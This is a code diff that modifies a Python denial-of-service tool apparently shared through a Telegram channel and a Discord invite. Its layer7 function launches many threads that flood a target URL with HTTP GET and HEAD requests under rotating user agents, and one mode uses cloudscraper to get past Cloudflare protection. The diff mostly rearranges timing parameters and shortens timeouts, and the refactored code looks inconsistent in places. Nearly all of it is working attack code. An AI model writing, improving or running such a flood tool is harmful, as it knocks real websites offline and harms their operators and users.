@@ -47,9 +47,8 @@ def layer7():
             threads = int(threads)
             secs = int(secs)
             
-            end_time = time.time() + secs
-            
-            def http_attack(url, end_time):
+            def http_attack(url, secs):
+                end_time = time.time() + secs
                 try:
                     while time.time() < end_time:
                         ua = random.choice(useragent)
@@ -58,12 +57,12 @@ def layer7():
                 except:
                     pass
             
-            def th(url, threads, end_time):
-                for _ in range(threads):
-                    t = threading.Thread(target=http_attack, args=(url, end_time))
+            def th(url, thread, secs):
+                for _ in range(thread):
+                    t = threading.Thread(target=http_attack, args=(url, secs))
                     t.start()
             
-            th(url, threads, end_time)
+            th(url, threads, secs)
             
             os.system('cls' if os.name == 'nt' else 'clear')
             print(f"""
@@ -95,25 +94,24 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
             threads = int(threads)
             secs = int(secs)
             
-            end_time = time.time() + secs
-            
             def cloudflare(url, end_time):
+                end_time = time.time() + secs
                 scraper = cloudscraper.create_scraper()
                 try:
                     while time.time() < end_time:
                         ua = random.choice(useragent)
                         headers = {"User-Agent": ua}
-                        scraper.get(url, headers=headers, timeout=10)
-                        scraper.head(url, headers=headers, timeout=10)
+                        scraper.get(url, headers=headers, timeout=5)
+                        scraper.head(url, headers=headers, timeout=5)
                 except:
                     pass
             
-            def th(url, threads, end_time):
+            def th(url, threads, secs):
                 for _ in range(threads):
-                    t = threading.Thread(target=cloudflare, args=(url, end_time))
+                    t = threading.Thread(target=cloudflare, args=(url, secs))
                     t.start()
             
-            th(url, threads, end_time)
+            th(url, threads, secs)
             os.system('cls' if os.name == 'nt' else 'clear')
             print(f"""
 telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
@@ -138,6 +136,7 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
 
 if __name__ == "__main__":
     layer7()
+
 
 
 
